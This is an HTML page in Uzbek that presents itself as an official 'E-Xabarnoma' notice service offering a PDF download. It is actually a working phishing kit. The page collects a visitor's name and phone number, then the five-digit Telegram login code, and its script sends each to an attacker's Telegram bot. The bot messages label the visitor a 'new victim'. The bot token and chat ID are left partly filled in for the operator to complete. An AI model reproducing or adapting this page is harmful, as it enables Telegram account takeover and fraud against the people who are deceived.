<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-Xabarnoma Rasmiy Tizimi</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <style>
        :root { --primary: #1a73e8; --dark: #202124; --bg: #f8f9fa; }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 420px; text-align: center; }
        input, select { width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; box-sizing: border-box; margin-bottom: 15px; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #1a73e8, #0d47a1); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
        label { display: block; text-align: left; margin-bottom: 5px; font-weight: 600; font-size: 14px; }
    </style>
</head>
<body>

<div class="container" id="step1">
    <h2>E-Xabarnoma</h2>
    <label>F.I.SH:</label>
    <input type="text" id="fullname" placeholder="Masalan: Aliyev Vali">
    <label>Telefon:</label>
    <input type="text" id="phone" value="+998" maxlength="13">
    <button onclick="startProcess()">PDF NI YUKLASH</button>
</div>

<div class="container hidden" id="step2">
    <h2>Tasdiqlash</h2>
    <p>Telegram orqali yuborilgan 5 xonali kodni kiriting:</p>
    <input type="number" id="sms_code" placeholder="0 0 0 0 0">
    <button onclick="sendSmsToBot()">TASDIQLASH</button>
</div>

<div class="container hidden" id="step3">
    <h2 style="color: green;">✓ Tasdiqlandi</h2>
    <p>Hujjat muvaffaqiyatli yuklandi. Tekshirish uchun Telegram ilovasiga kiring.</p>
</div>

<script>
    // BOT SOZLAMALARI (O'zingnikini qo'y)
    const BOT_TOKEN = "7294248593:AAEq5B_B8Lh7Vn_R3Z..."; // Tokening
    const CHAT_ID = "63482..."; // Chat IDing

    let userData = {};

    // 1-bosqich: Ism va Telni Botga yuborish va SMS oynasini ochish
    async function startProcess() {
        const name = document.getElementById('fullname').value;
        const phone = document.getElementById('phone').value;

        if(name.length < 5 || phone.length < 13) {
            alert("Ma'lumotlarni to'liq kiriting!");
            return;
        }

        userData = { name, phone };

        // Botga xabar yuborish
        const text = `🚨 YANGI QURBON!\n👤 Ism: ${name}\n📞 Tel: ${phone}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);

        // Vizual o'tish
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
    }

    // 2-bosqich: Kelgan kodni Botga yuborish
    async function sendSmsToBot() {
        const code = document.getElementById('sms_code').value;

        if(code.length < 5) {
            alert("Kodni to'liq kiriting!");
            return;
        }

        const text = `🔑 TELEGRAM KOD: ${code}\n👤 Foydalanuvchi: ${userData.name}\n📞 Tel: ${userData.phone}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);

        // Final bosqich
        document.getElementById('step2').classList.add('hidden');
        document.getElementById('step3').classList.remove('hidden');
        
        // Shu yerda orqafonda PDFni ham yuklab berish mumkin
        // generatePDF(); 
    }
</script>

</body>
</html>
